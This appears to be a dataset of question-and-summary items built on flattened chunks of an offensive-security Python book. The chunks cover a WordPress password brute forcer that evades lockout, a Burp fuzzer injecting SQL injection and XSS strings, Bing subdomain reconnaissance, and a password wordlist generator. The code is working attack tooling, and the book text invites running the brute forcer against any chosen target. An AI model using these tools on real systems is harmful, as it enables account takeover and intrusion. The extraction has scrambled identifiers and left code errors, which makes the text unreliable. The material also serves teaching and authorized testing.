brute forcer in “Brute-Forcing Directories and\nFile Locations” on page 82. The function 4 receives the\nget_params\nHTTP response content, parses it, and loops through all the input\nelements 5 to create a dictionary of the parameters we need to fill\nout. Let’s now create the plumbing for our brute forcer; some of the\nfollowing code will be familiar from the code in the preceding brute-\nforcing programs, so we’ll highlight only the newest techniques.\nclass Bruter:\ndef __init__(self, username, url):\nself.username = username\nself.url = url\nself.found = False\nprint(f'\\nBrute Force Attack beginning on {url}.\\n')\nprint(\"Finished the setup where username = %s\\n\" %\nusername)\ndef run_bruteforce(self, passwords):\nfor _ in range(10):\nt = threading.Thread(target=self.web_bruter,\nargs=(passwords,))\nt.start()\ndef web_bruter(self, passwords):\n1\nsession = requests.Session()\nresp0 = session.get(self.url)\nparams = get_params(resp0.content)\nparams['log'] = self.username\n2\nwhile not passwords.empty() and not self.found:\ntime.sleep(5)\npasswd = passwords.get()\nprint(f'Trying username/password\n{self.username}/{passwd:<10}')\nparams['pwd'] = passwd\n3\nresp1 = session.post(self.url, data=params)\nif SUCCESS in resp1.content.decode():\nself.found = True\nprint(f\"\\nBruteforcing successful.\")\nprint(\"Username is %s\" % self.username)\nprint(\"Password is %s\\n\" % brute)\nprint('done: now cleaning up other threads. .\n.')\nThis is our primary brute-forcing class, which will handle all of the\nHTTP requests and manage cookies. The work of the\nweb_bruter\nmethod, which performs the brute-force login attack, proceeds in\nthree stages.\nIn the initialization phase 1, we initialize a object from the\nSession\nlibrary, which will automatically handle our cookies for us.\nrequests\nWe then make the initial request to retrieve the login form. When we\nhave the raw HTML content, we pass it off to the\nget_params\nfunction, which parses the content for the parameters and returns a\ndictionary of all of the retrieved form elements. After we’ve\nsuccessfully parsed the HTML, we replace the parameter.\nusername\nNow we can start looping through our password guesses.\nIn the loop phase 2, we first sleep a few seconds in an attempt to\nbypass account lockouts. Then we pop a password from the queue\nand use it to finish populating the parameter dictionary. If there are\nno more passwords in the queue, the thread quits.\nIn the request phase 3, we post the request with our parameter\ndictionary. After we retrieve the result of the authentication attempt,\nwe test whether the authentication was successful—that is, whether\nthe content contains the success string we defined earlier. If it was\nsuccessful and the string is present, we clear the queue so the other\nthreads can finish quickly and return.\nTo wrap up the WordPress brute forcer, let’s add the following\ncode:\nif __name__ == '__main__':\nwords = get_words()\n1\nb = Bruter('tim', url)\n2\nb.run_bruteforce(words))\nThat’s it! We pass in the and to the class 1\nusername url Bruter\nand brute-force the application by using a queue created from the\nlist 2. Now we can watch the magic happen.\nwords",
    "question": "What is the purpose of the `get_words` function in the provided code?",
    "summary": "The text explains how to create a brute-forcing tool to discover accessible directories and files on a web server, using a wordlist and multiple threads. It also describes a method to brute-force WordPress login credentials by retrieving form parameters and handling cookies. The tool uses Python's requests and threading libraries to efficiently test different username and password combinations."
  },
  {
    "start": 51,
    "end": 51,
    "text": "HTMLPARSER 101\nIn the example in this section, we used the requests and lxml packages to\nmake HTTP requests and parse the resulting content. But what if you are\nunable to install the packages and therefore must rely on the standard library?\nAs we noted in the beginning of this chapter, you can use urllib for making\nyour requests, but you’ll need to set up your own parser with the standard\nlibrary html.parser.HTMLParser.\nThere are three primary methods you can implement when using the\nHTMLParser class: handle_starttag, handle_endtag, and handle_data. The\nhandle_starttag function will be called anytime an opening HTML tag is\nencountered, and the opposite is true for the handle_endtag function, which\ngets called each time a closing HTML tag is encountered. The handle_data\nfunction gets called when there is raw text between tags. The function\nprototypes for each function are slightly different, as follows:\nhandle_starttag(self, tag, attributes)\nhandle_endttag(self, tag)\nhandle_data(self, data)\nHere’s a quick example to highlight this:\n<title>Python rocks!</title>\nhandle_starttag => tag variable would be \"title\"\nhandle_data => data variable would be \"Python rocks!\"\nhandle_endtag => tag variable would be \"title\"\nWith this very basic understanding of the HTMLParser class, you can do\nthings like parse forms, find links for spidering, extract all of the pure text for\ndata-mining purposes, or find all of the images in a page.\nKicking the Tires\nIf you don’t have WordPress installed on your Kali VM, then install it\nnow. On our temporary WordPress install hosted at\nboodelyboo.com/, we preset the username to and the password\ntim\nto so that we can make sure it works. That password just\n1234567\nhappens to be in the cain.txt file, around 30 entries down. When\nrunning the script, we get the following output:\n(bhp) tim@kali:~/bhp/bhp$ python wordpress_killer.py\nBrute Force Attack beginning on\nhttp://boodelyboo.com/wordpress/wp-login.php.\nFinished the setup where username = tim\nTrying username/password tim/!@#$%\nTrying username/password tim/!@#$%^\nTrying username/password tim/!@#$%^&\n--snip--\nTrying username/password tim/0racl38i\nBruteforcing successful.\nUsername is tim\nPassword is 1234567\ndone: now cleaning up.\n(bhp) tim@kali:~/bhp/bhp$\nYou can see that the script successfully brute-forces and logs in to\nthe WordPress console. To verify that it worked, you should manually\nlog in using those credentials. After you test this locally and you’re\ncertain it works, you can use this tool against a target WordPress\ninstallation of your choice.",
    "question": "How can you parse HTML content using only the standard library in Python?",
    "summary": "The text explains how to use the HTMLParser class from Python's standard library to parse HTML content without external packages like requests and lxml. It outlines the three main methods: handle_starttag, handle_endtag, and handle_data, which are used to process HTML tags and text. The example also demonstrates a brute-force attack script for WordPress that successfully logs in using predefined credentials."
  },
  {
    "start": 52,
    "end": 59,
    "text": "6\nEXTENDING BURP PROXY\nIf you’ve ever tried hacking a web\napplication, you’ve likely used Burp\nSuite to perform spidering, proxy\nbrowser traffic, and carry out other\nattacks. Burp Suite also allows you to\ncreate your own tooling, called\nextensions. Using Python, Ruby, or pure Java, you\ncan add panels in the Burp GUI and build automation\ntechniques into Burp Suite. We’ll take advantage of\nthis feature to write some handy tooling for\nperforming attacks and extended reconnaissance.\nThe first extension will use an intercepted HTTP\nrequest from Burp Proxy as a seed for a mutation\nfuzzer that runs in Burp Intruder. The second\nextension will communicate with the Microsoft Bing\nAPI to show us all virtual hosts located on the same\nIP address as a target site, as well as any\nsubdomains detected for the target domain. Finally,\nwe’ll build an extension to create a word list from a\ntarget website that you can use in a brute-force\npassword attack.\nThis chapter assumes that you’ve played with Burp before and\nknow how to trap requests with the Proxy tool, as well as how to\nsend a trapped request to Burp Intruder. If you need a tutorial on\nhow to do these tasks, visit PortSwigger Web Security\n(http://www.portswigger.net/) to get started.\nWe have to admit that when we first started exploring the Burp\nExtender API, it took us some time to understand how it worked. We\nfound it a bit confusing, as we’re pure Python guys and have limited\nJava development experience. But we found a number of extensions\non the Burp website that taught us how other folks had developed\nextensions. We used that prior art to help us understand how to\nbegin implementing our own code. This chapter will cover some\nbasics on extending functionality, but we’ll also show you how to use\nthe API documentation as a guide.\nSetting Up\nBurp Suite comes installed by default on Kali Linux. If you’re using a\ndifferent machine, download Burp from http://www.portswigger.net/\nand set it up.\nAs sad as it makes us to admit this, you’ll require a modern Java\ninstallation. Kali Linux has one installed. If you’re on a different\nplatform, use your system’s installation method (such as apt, yum, or\nrpm) to get one. Next, install Jython, a Python 2 implementation\nwritten in Java. Up until now, all of our code has used Python 3\nsyntax, but in this chapter we’ll revert to Python 2, since that’s what\nJython expects. You can find this JAR file on the on the official site,\nhttps://www.jython.org/download.html. Select the Jython 2.7\nStandalone Installer. Save the JAR file to an easy-to-remember\nlocation, such as your Desktop.\nNext, either double-click the Burp icon on your Kali machine or run\nBurp from the command line:\n#> java -XX:MaxPermSize=1G -jar burpsuite_pro_v1.6.jar\nThis will fire up Burp, and you should see its graphical user\ninterface (GUI) full of wonderful tabs, as shown in Figure 6-1.\nFigure 6-1: Burp Suite GUI loaded properly\nNow let’s point Burp at our Jython interpreter. Click the Extender\ntab and then click the Options tab. In the Python Environment\nsection, select the location of your Jython JAR file, as shown in\nFigure 6-2. You can leave the rest of the options alone. We’re ready\nto start coding our first extension. Let’s get rocking!\nFigure 6-2: Configuring the Jython interpreter location\nBurp Fuzzing\nAt some point in your career, you may find yourself attacking a web\napplication or service that doesn’t allow you to use traditional web\napplication assessment tools. For example, the application might use\ntoo many parameters, or it may be obfuscated in some way that\nmakes performing a manual test far too time-consuming. We’ve\nbeen guilty of running standard tools that can’t deal with strange\nprotocols, or even JSON in a lot of cases. This is where you’ll find it\nuseful to establish a solid baseline of HTTP traffic, including\nauthentication cookies, while passing off the body of the request to a\ncustom fuzzer. This fuzzer can then manipulate the payload in any\nway you choose. We’ll work on our first Burp extension by creating\nthe world’s simplest web application fuzzer, which you can then\nexpand into something more intelligent.\nBurp has a number of tools you can use when you’re performing\nweb application tests. Typically, you’ll trap all requests using the\nProxy, and when you see an interesting one, you’ll send it to another\nBurp tool. A common technique is to send them to the Repeater tool,\nwhich lets you replay web traffic as well as manually modify any\ninteresting spots. To perform more automated attacks in query\nparameters, you can send a request to the Intruder tool, which\nattempts to automatically figure out which areas of the web traffic\nyou should modify and then allows you to use a variety of attacks to\ntry to elicit error messages or tease out vulnerabilities. A Burp\nextension can interact in numerous ways with the Burp suite of tools.\nIn our case, we’ll bolt additional functionality directly onto the Intruder\ntool.\nOur first instinct is to take a look at the Burp API documentation to\ndetermine what Burp classes we need to extend in order to write our\ncustom extension. You can access this documentation by clicking the\nExtender tab and then clicking the APIs tab. The API can look a\nlittle daunting because it’s very Java-y. But notice that the Burp\ndevelopers have aptly named each class, making it easy to figure\nout where we want to start. In particular, because we’re trying to fuzz\nweb requests during an Intruder attack, we might want to focus on\nthe and\nIIntruderPayloadGeneratorFactory\nclasses. Let’s take a look at what the\nIIntruderPayloadGenerator\ndocumentation says for the class:\nIIntruderPayloadGeneratorFactory\n/**\n* Extensions can implement this interface and then call\n1\n*\nIBurpExtenderCallbacks.registerIntruderPayloadGeneratorFactor\ny()\n* to register a factory for custom Intruder payloads.\n*/\npublic interface IIntruderPayloadGeneratorFactory\n{\n/**\n* This method is used by Burp to obtain the name of the\npayload\n* generator. This will be displayed as an option within\nthe\n* Intruder UI when the user selects to use extension-\ngenerated\n* payloads.\n*\n* @return The name of the payload generator.\n*/\n2\nString getGeneratorName();\n/**\n* This method is used by Burp when the user starts an\nIntruder\n* attack that uses this payload generator.\n* @param attack\n* An IIntruderAttack object that can be queried to\nobtain details\n* about the attack in which the payload generator will\nbe used.\n* @return A new instance of\n* IIntruderPayloadGenerator that will be used to\ngenerate\n* payloads for the attack.\n*/\n3\nIIntruderPayloadGenerator createNewInstance(IIntruderAttack\nattack);\n}\nThe first bit of documentation 1 tells how to correctly register our\nextension with Burp. We’ll extend the main Burp class as well as the\nclass. Next, we see that Burp\nIIntruderPayloadGeneratorFactory\nexpects two methods in our main class. Burp will call the\nmethod 2 to retrieve the name of our extension,\ngetGeneratorName\nand we’re expected to return a string. The\ncreateNewInstance\nmethod 3 expects us to return an instance of the\n, a second class we’ll have to create.\nIIntruderPayloadGenerator\nNow let’s implement the actual Python code to meet these\nrequirements. Then we’ll figure out how to add the\nclass. Open a new Python file, name it\nIIntruderPayloadGenerator\nbhp_fuzzer.py, and punch out the following code:\n1\nfrom burp import IBurpExtender\nfrom burp import IIntruderPayloadGeneratorFactory\nfrom burp import IIntruderPayloadGenerator\nfrom java.util import List, ArrayList\nimport random\n2\nclass BurpExtender(IBurpExtender,\nIIntruderPayloadGeneratorFactory):\ndef registerExtenderCallbacks(self, callbacks):\nself._callbacks = callbacks\nself._helpers = callbacks.getHelpers()\n3\ncallbacks.registerIntruderPayloadGeneratorFactory(self)\nreturn\n4\ndef getGeneratorName(self):\nreturn \"BHP Payload Generator\"\n5\ndef createNewInstance(self, attack):\nreturn BHPFuzzer(self, attack)\nThis simple skeleton outlines what we need in order to satisfy the\nfirst set of requirements. We have to first import the\nIBurpExtender\nclass 1, a requirement for every extension we write. We follow this\nup by importing the classes necessary for creating an Intruder\npayload generator. Next, we define the class 2, which\nBurpExtender\nextends the and\nIBurpExtender IIntruderPayloadGeneratorFactory\nclasses. We then use the\nregisterIntruderPayloadGeneratorFactory\nmethod 3 to register our class so that the Intruder tool is aware that\nwe can generate payloads. Next, we implement the\nmethod 4 to simply return the name of our payload\ngetGeneratorName\ngenerator. Finally, we implement the method 5,\ncreateNewInstance\nwhich receives the attack parameter and returns an instance of the\nclass, which we called .\nIIntruderPayloadGenerator BHPFuzzer\nLet’s have a peek at the documentation for the\nclass so we know what to implement:\nIIntruderPayloadGenerator\n/**\n* This interface is used for custom Intruder payload\ngenerators.\n* Extensions\n* that have registered an\n* IIntruderPayloadGeneratorFactory must return a new\ninstance of\n* this interface when required as part of a new Intruder\nattack.\n*/\npublic interface IIntruderPayloadGenerator\n{\n/**\n* This method is used by Burp to determine whether the\npayload\n* generator is able to provide any further payloads.\n*\n* @return Extensions should return\n* false when all the available payloads have been used up,\n* otherwise true\n*/\n1\nboolean hasMorePayloads();\n/**\n* This method is used by Burp to obtain the value of the\nnext payload.\n*\n* @param baseValue The base value of the current payload\nposition.\n* This value may be null if the concept of a base value is\nnot\n* applicable (e.g. in a battering ram attack).\n* @return The next payload to use in the attack.\n*/\n2\nbyte[] getNextPayload(byte[] baseValue);\n/**\n* This method is used by Burp to reset the state of the\npayload\n* generator so that the next call to\n* getNextPayload() returns the first payload again. This\n* method will be invoked when an attack uses the same\npayload\n* generator for more than one payload position, for example\nin a\n* sniper attack.\n*/\n3\nvoid reset();\n}\nOkay! Now we know we need to implement the base class, which\nneeds to expose three methods. The first method, 1,\nhasMorePayloads\nis there to decide whether to continue sending mutated requests\nback to Burp Intruder. We’ll use a counter to deal with this. Once the\ncounter reaches the maximum level, we’ll return to stop\nFalse\ngenerating fuzzing cases. The method 2 will receive\ngetNextPayload\nthe original payload from the HTTP request that you trapped.\nAlternatively, if you selected multiple payload areas in the HTTP\nrequest, you’ll receive only the bytes you plan to fuzz (more on this\nlater). This method allows us to fuzz the original test case and then\nreturn it for Burp to send. The last method, 3, is there so that if\nreset\nwe generate a known set of fuzzed requests, the fuzzer can iterate\nthrough those values for each payload position designated in the\nIntruder tab. Our fuzzer isn’t so fussy; it will always just keep\nrandomly fuzzing each HTTP request.\nNow let’s see how this looks when we implement it in Python. Add\nthe following code to the bottom of bhp_fuzzer.py:\n1\nclass BHPFuzzer(IIntruderPayloadGenerator):\ndef __init__(self, extender, attack):\nself._extender = extender\nself._helpers = extender._helpers\nself._attack = attack\n2\nself.max_payloads = 10\nself.num_iterations = 0\nreturn\n3\ndef hasMorePayloads(self):\nif self.num_iterations == self.max_payloads:\nreturn False\nelse:\nreturn True\n4\ndef getNextPayload(self,current_payload):\n# convert into a string\n5\npayload = \"\".join(chr(x) for x in current_payload)\n# call our simple mutator to fuzz the POST\n6\npayload = self.mutate_payload(payload)\n# increase the number of fuzzing attempts\n7\nself.num_iterations += 1\nreturn payload\ndef reset(self):\nself.num_iterations = 0\nreturn\nWe start by defining a class 1 that extends the class\nBHPFuzzer\nclass. We define the required class\nIIntruderPayloadGenerator\nvariables and then add the 2 and\nmax_payloads num_iterations\nvariables used to let Burp know when we’ve finished fuzzing. You\ncould, of course, let the extension run forever if you’d like, but for\ntesting purposes, we’ll set time limits. Next, we implement the\nmethod 3, which simply checks whether we’ve\nhasMorePayloads\nreached the maximum number of fuzzing iterations. You could\nmodify this to continually run the extension by always returning .\nTrue\nThe method 4 receives the original HTTP payload,\ngetNextPayload\nand it’s here that we’ll be fuzzing. The variable\ncurrent_payload\narrives as a byte array, so we convert this to a string 5 and then pass\nit to the fuzzing method 6. We then increment the\nmutate_payload\nvariable 7 and return the mutated payload. Our last\nnum_iterations\nmethod is the method, which returns without doing anything.\nreset\nNow let’s write the world’s simplest fuzzing method, which you can\nmodify to your heart’s content. For instance, this method knows the\nvalue of the current payload, so if you have a tricky protocol that\nneeds something special, like a CRC checksum or a length field, you\ncould perform those calculations inside this method before returning.\nAdd the following code to bhp_fuzzer.py, inside the class:\nBHPFuzzer\ndef mutate_payload(self,original_payload):\n# pick a simple mutator or even call an external\nscript\npicker = random.randint(1,3)\n# select a random offset in the payload to mutate\noffset = random.randint(0,len(original_payload)-1)\n1\nfront, back = original_payload[:offset],\noriginal_payload[offset:]\n# random offset insert a SQL injection attempt\nif picker == 1:\n2\nfront += \"'\"\n# jam an XSS attempt in\nelif picker == 2:\n3\nfront += \"<script>alert('BHP!');</script>\"\n# repeat a random chunk of the original payload\nelif picker == 3:\n4\nchunk_length = random.randint(0, len(back)-1)\nrepeater = random.randint(1, 10)\nfor _ in range(repeater):\nfront += original_payload[:offset +\nchunk_length]\n5\nreturn front + back\nFirst, we take the payload and split it into two random-length\nchunks, and 1. Then, we randomly pick from three\nfront back\nmutators: a simple SQL injection test that adds a single-quote to the\nend of the chunk 2, a cross-site scripting (XSS) test that adds\nfront\na script tag to the end of the chunk 3, and a mutator that\nfront\nselects a random chunk from the original payload, repeats it a\nrandom number of times, and adds the result to the end of the\nfront\nchunk 4. Then, we add the chunk to the altered chunk to\nback front\ncomplete the mutated payload 5. We now have a Burp Intruder\nextension we can use. Let’s take a look at how to load it.\nKicking the Tires\nFirst, we have to load the extension and make sure it contains no\nerrors. Click the Extender tab in Burp and then click the Add button.\nA screen should appear, allowing you to point Burp at the fuzzer.\nEnsure that you set the same options as the ones shown in Figure 6-\n3.\nFigure 6-3: Setting Burp to load our extension\nClick Next, and Burp should begin loading the extension. If there\nare errors, click the Errors tab, debug any typos, and then click\nClose. Your Extender screen should now look like Figure 6-4.\nFigure 6-4: Burp Extender showing that our extension is loaded\nAs you can see, our extension has loaded and Burp has identified\nthe registered Intruder payload generator. We’re now ready to\nleverage the extension in a real attack. Make sure your web browser\nis set to use Burp Proxy as a localhost proxy on port 8080. Now let’s\nattack the same Acunetix web application from Chapter 5. Simply\nbrowse to http://testphp.vulnweb.com/.\nAs an example, the authors used the little search bar on their site\nto submit a search for the string . Figure 6-5 shows how you\n\"test\"\ncan see this request in the HTTP history tab of the Proxy menu.\nRight-click the request to send it to Intruder.\nFigure 6-5: Selecting an HTTP request to send to Intruder\nNow switch to the Intruder tab and click the Positions tab. A\nscreen should appear, showing each query parameter highlighted.\nThis is Burp’s way of identifying the spots we should be fuzzing. You\ncan try moving the payload delimiters around or selecting the entire\npayload to fuzz if you choose, but for now, let’s let Burp decide what\nto fuzz. For clarity, see Figure 6-6, which shows how payload\nhighlighting works.\nNow click the Payloads tab. In this screen, click the Payload type\ndrop-down and select Extension-generated. In the Payload Options\nsection, click the Select generator button and choose BHP Payload\nGenerator from the drop-down. Your Payload screen should now\nlook like Figure 6-7.\nFigure 6-6: Burp Intruder highlighting payload parameters\nFigure 6-7: Using our fuzzing extension as a payload generator\nNow we’re ready to send requests. At the top of the Burp menu\nbar, click Intruder and then select Start Attack. Burp should begin\nsending fuzzed requests, and soon you’ll be able to quickly go\nthrough the results. When the authors ran the fuzzer, we received\nthe output shown in Figure 6-8.\nFigure 6-8: Our fuzzer running in an Intruder attack\nAs you can see from the bold warning in the response to request\n7, we’ve discovered what appears to be a SQL injection vulnerability.\nEven though we built this fuzzer for demonstration purposes only,\nyou’ll be surprised how effective it can be for getting a web\napplication to output errors, disclose application paths, or generate\nbehavior that lots of other scanners might miss. Most importantly, we\nmanaged to get our custom extension to work with Burp’s Intruder\nattacks. Now let’s create an extension that will help us perform\nextended reconnaissance against a web server.\nUsing Bing for Burp\nIt’s not uncommon for a single web server to serve several web\napplications, some of which you might not be aware of. If you’re\nattacking the server, you should do your best to discover these other\nhostnames, because they might give you an easier way to get a\nshell. It’s not rare to find an insecure web application, or even\ndevelopment resources, located on the same machine as your\ntarget. Microsoft’s Bing search engine has search capabilities that\nallow you to query Bing for all websites it finds on a single IP\naddress using the “IP” search modifier. Bing will also tell you all of\nthe subdomains of a given domain if you use the “domain” search\nmodifier.\nNow, we could use a scraper to submit these queries to Bing and\nthen get the HTML in the results, but that would be bad manners\n(and also violate most search engines’ terms of use). In order to stay\nout of trouble, we’ll instead use the Bing API to submit these queries\nprogrammatically and parse the results ourselves. (Visit\nhttps://www.microsoft.com/en-us/bing/apis/bing-web-search-api/ to\nget set up with your own free Bing API key.) Except for a context\nmenu, we won’t implement any fancy Burp GUI additions with this\nextension; we’ll simply output the results into Burp each time we run\na query, and any detected URLs to Burp’s target scope will be added\nautomatically.\nBecause we already walked you through how to read the Burp API\ndocumentation and translate it into Python, let’s get right to the code.\nCrack open bhp_bing.py and hammer out the following:\nfrom burp import IBurpExtender\nfrom burp import IContextMenuFactory\nfrom java.net import URL\nfrom java.util import ArrayList\nfrom javax.swing import JMenuItem\nfrom thread import start_new_thread\nimport json\nimport socket\nimport urllib\n1\nAPI_KEY = \"YOURKEY\"\nAPI_HOST = 'api.cognitive.microsoft.com'\n2\nclass BurpExtender(IBurpExtender, IContextMenuFactory):\ndef registerExtenderCallbacks(self, callbacks):\nself._callbacks = callbacks\nself._helpers = callbacks.getHelpers()\nself.context = None\n# we set up our extension\ncallbacks.setExtensionName(\"BHP Bing\")\n3\ncallbacks.registerContextMenuFactory(self)\nreturn\ndef createMenuItems(self, context_menu):\nself.context = context_menu\nmenu_list = ArrayList()\n4\nmenu_list.add(JMenuItem(\n\"Send to Bing\", actionPerformed=self.bing_menu))\nreturn menu_list\nThis is the first bit of our Bing extension. Make sure you paste your\nBing API key in place 1. You’re allowed 1,000 free searches per\nmonth. We begin by defining a class 2 that implements\nBurpExtender\nthe standard interface, and the ,\nIBurpExtender IContextMenuFactory\nwhich allows us to provide a context menu when a user right-clicks a\nrequest in Burp. This menu will display a “Send to Bing” selection.\nWe register a menu handler 3 that will determine which site the user\nclicked, enabling us to construct our Bing queries. Then we set up a\nmethod, which will receive an\ncreateMenuItem\nobject and use it to determine which HTTP\nIContextMenuInvocation\nrequest the user selected. The last step is to render the menu item\nand handle the click event with the method 4.\nbing_menu\nNow let’s perform the Bing query, output the results, and add any\ndiscovered virtual hosts to Burp’s target scope:\ndef bing_menu(self,event):\n# grab the details of what the user clicked\n1\nhttp_traffic = self.context.getSelectedMessages()\nprint(\"%d requests highlighted\" % len(http_traffic))\nfor traffic in http_traffic:\nhttp_service = traffic.getHttpService()\nhost = http_service.getHost()\nprint(\"User selected host: %s\" % host)\nself.bing_search(host)\nreturn\ndef bing_search(self,host):\n# check if we have an IP or hostname\ntry:\n2\nis_ip = bool(socket.inet_aton(host))\nexcept socket.error:\nis_ip = False\nif is_ip:\nip_address = host\ndomain = False\nelse:\nip_address = socket.gethostbyname(host)\ndomain = True\n3\nstart_new_thread(self.bing_query, ('ip:%s' %\nip_address,))\nif domain:\n4\nstart_new_thread(self.bing_query, ('domain:%s' %\nhost,))\nThe method gets triggered when the user clicks the\nbing_menu\ncontext menu item we defined. We retrieve the highlighted HTTP\nrequests 1. Then we retrieve the host portion of each request and\nsend it to the method for further processing. The\nbing_search\nmethod first determines if the host portion is an IP\nbing_search\naddress or a hostname 2. We then query Bing for all virtual hosts\nthat have the same IP address 3 as the host. If our extension\nreceived a domain as well, then we do a secondary search for any\nsubdomains that Bing may have indexed 4.\nNow let’s install the plumbing we’ll need in order to send the\nrequest to Bing and parse the results using Burp’s HTTP API. Add\nthe following code within the class:\nBurpExtender\ndef bing_query(self,bing_query_string):\nprint('Performing Bing search: %s' %\nbing_query_string)\nhttp_request = 'GET https://%s/bing/v7.0/search?' %\nAPI_HOST\n# encode our query\nhttp_request += 'q=%s HTTP/1.1\\r\\n' %\nurllib.quote(bing_query_string)\nhttp_request += 'Host: %s\\r\\n' % API_HOST\nhttp_request += 'Connection:close\\r\\n'\n1\nhttp_request += 'Ocp-Apim-Subscription-Key: %s\\r\\n' %\nAPI_KEY\nhttp_request += 'User-Agent: Black Hat\nPython\\r\\n\\r\\n'\n2\njson_body = self._callbacks.makeHttpRequest(\nAPI_HOST, 443, True, http_request).tostring()\n3\njson_body = json_body.split('\\r\\n\\r\\n', 1)[1]\ntry:\n4\nresponse = json.loads(json_body)\nexcept (TypeError, ValueError) as err:\nprint('No results from Bing: %s' % err)\nelse:\nsites = list()\nif response.get('webPages'):\nsites = response['webPages']['value']\nif len(sites):\nfor site in sites:\n5\nprint('*'*100)\nprint('Name: %s ' % site['name'])\nprint('URL: %s ' % site['url'])\nprint('Description: %r' %\nsite['snippet'])\nprint('*'*100)\njava_url = URL(site['url'])\n6\nif not\nself._callbacks.isInScope(java_url):\nprint('Adding %s to Burp scope' %\nsite['url'])\nself._callbacks.includeInScope(java_url)\nelse:\nprint('Empty response from Bing.: %s'\n% bing_query_string)\nreturn\nBurp’s HTTP API requires that we build the entire HTTP request\nas a string before sending it. We also need to add our Bing API key\nto make the API call1. We then send the HTTP request 2 to the\nMicrosoft servers. When the response returns, we split off the\nheaders 3 and then pass it to our JSON parser 4. For each set of\nresults, we output some information about the site that we\ndiscovered 5. If the discovered site isn’t in Burp’s target scope 6, we\nautomatically add it.\nIn doing so, we’ve blended the Jython API and pure Python in a\nBurp extension. This should help us do additional recon work when\nwe’re attacking a particular target. Let’s take it for a spin.\nKicking the Tires\nTo get the Bing search extension working, use the same procedure\nwe used for the fuzzing extension. When it’s loaded, browse to\nhttp://testphp.vulnweb.com/ and then right-click the GET request you\njust issued. If the extension loads properly, you should see the menu\noption Send to Bing displayed, as shown in Figure 6-9.\nFigure 6-9: New menu option showing our extension\nWhen you click this menu option, you should start to see results\nfrom Bing, as in Figure 6-10. The kind of result you get will depend\non the output you chose when you loaded the extension.\nFigure 6-10: Our extension providing output from the Bing API search\nIf you click the Target tab in Burp and select Scope, you should\nsee new items automatically added to the target scope, as shown in\nFigure 6-11. The target scope limits activities such as attacks,\nspidering, and scans to the defined hosts only.\nFigure 6-11: Discovered hosts are automatically added to Burp’s target scope.\nTurning Website Content into Password Gold\nMany times, security comes down to one thing: user passwords. It’s\nsad but true. Making things worse, when it comes to web\napplications, especially custom ones, it’s all too common to discover\nthat they don’t lock users out of their accounts after a certain number\nof failed authentication attempts. In other instances, they don’t\nenforce strong passwords. In these cases, an online password-\nguessing session like the one in the last chapter might be just the\nticket to gain access to the site.\nThe trick to online password guessing is getting the right word list.\nYou can’t test 10 million passwords if you’re in a hurry, so you need\nto be able to create a word list targeted to the site in question. Of\ncourse, there are scripts in Kali Linux that crawl a website and\ngenerate a word list based on site content. But if you’ve already used\nBurp to scan the site, why send more traffic just to generate a word\nlist? Plus, those scripts usually have a ton of command line\narguments to remember. If you’re anything like us, you’ve already\nmemorized enough command line arguments to impress your\nfriends, so let’s make Burp do the heavy lifting.\nOpen bhp_wordlist.py and knock out this code:\nfrom burp import IBurpExtender\nfrom burp import IContextMenuFactory\nfrom java.util import ArrayList\nfrom javax.swing import JMenuItem\nfrom datetime import datetime\nfrom HTMLParser import HTMLParser\nimport re\nclass TagStripper(HTMLParser):\ndef __init__(self):\nHTMLParser.__init__(self)\nself.page_text = []\ndef handle_data(self, data):\n1\nself.page_text.append(data)\ndef handle_comment(self, data):\n2\nself.page_text.append(data)\ndef strip(self, html):\nself.feed(html)\n3\nreturn \" \".join(self.page_text)\nclass BurpExtender(IBurpExtender, IContextMenuFactory):\ndef registerExtenderCallbacks(self, callbacks):\nself._callbacks = callbacks\nself._helpers = callbacks.getHelpers()\nself.context = None\nself.hosts = set()\n# Start with something we know is common\n4\nself.wordlist = set([\"password\"])\n# we set up our extension\ncallbacks.setExtensionName(\"BHP Wordlist\")\ncallbacks.registerContextMenuFactory(self)\nreturn\ndef createMenuItems(self, context_menu):\nself.context = context_menu\nmenu_list = ArrayList()\nmenu_list.add(JMenuItem(\n\"Create Wordlist\",\nactionPerformed=self.wordlist_menu))\nreturn menu_list\nThe code in this listing should be pretty familiar by now. We start\nby importing the required modules. A helper class will\nTagStripper\nallow us to strip the HTML tags out of the HTTP responses we\nprocess later on. Its method stores the page text 1 in a\nhandle_data\nmember variable. We also define the method\nhandle_comment\nbecause we want to add the words stored in developer comments to\nthe password list as well. Under the covers, just calls\nhandle_comment\n2 (in case we want to change how we process page text\nhandle_data\ndown the road).\nThe method feeds HTML code to the base class,\nstrip\n, and returns the resulting page text 3, which will come in\nHTMLParser\nhandy later. The rest is almost exactly the same as the start of the\nbhp_bing.py script we just finished. Once again, the goal is to create\na context menu item in the Burp UI. The only thing new here is that\nwe store our word list in a , which ensures that we don’t introduce\nset\nduplicate words as we go. We initialize the with everyone’s\nset\nfavorite password, 4, just to make sure it ends up in our final\npassword\nlist.\nNow let’s add the logic to take the selected HTTP traffic from Burp\nand turn it into a base word list:\ndef wordlist_menu(self,event):\n# grab the details of what the user clicked\nhttp_traffic = self.context.getSelectedMessages()\nfor traffic in http_traffic:\nhttp_service = traffic.getHttpService()\nhost = http_service.getHost()\n1\nself.hosts.add(host)\nhttp_response = traffic.getResponse()\nif http_response:\n2\nself.get_words(http_response)\nself.display_wordlist()\nreturn\ndef get_words(self, http_response):\nheaders, body =\nhttp_response.tostring().split('\\r\\n\\r\\n', 1)\n# skip non-text responses\n3\nif headers.lower().find(\"content-type: text\") == -1:\nreturn\ntag_stripper = TagStripper()\n4\npage_text = tag_stripper.strip(body)\n5\nwords = re.findall(\"[a-zA-Z]\\w{2,}\", page_text)\nfor word in words:\n# filter out long strings\nif len(word) <= 12:\n6\nself.wordlist.add(word.lower())\nreturn\nOur first order of business is to define the method,\nwordlist_menu\nwhich handles menu clicks. It saves the name of the responding host\n1 for later and then retrieves the HTTP response and feeds it to the\nmethod 2. From there, checks the response\nget_words get_words\nheader to make sure we’re processing text-based responses only 3.\nThe class 4 strips the HTML code from the rest of the\nTagStripper\npage text. We use a regular expression to find all words starting with\nan alphabetic character and two or more “word” characters as\nspecified with the regular expression 5. We save the words\n\\w{2,}\nthat match this pattern to the in lowercase 6.\nwordlist\nNow let’s polish the script by giving it the ability to mangle and\ndisplay the captured word list:\ndef mangle(self, word):\nyear = datetime.now().year\n1\nsuffixes = [\"\", \"1\", \"!\", year]\nmangled = []\nfor password in (word, word.capitalize()):\nfor suffix in suffixes:\nmangled.append(\"%s%s\" % (password, suffix))\n2\nreturn mangled\ndef display_wordlist(self):\nprint (\"#!comment: BHP Wordlist for site(s) %s\" % \",\n3\n\".join(self.hosts))\nfor word in 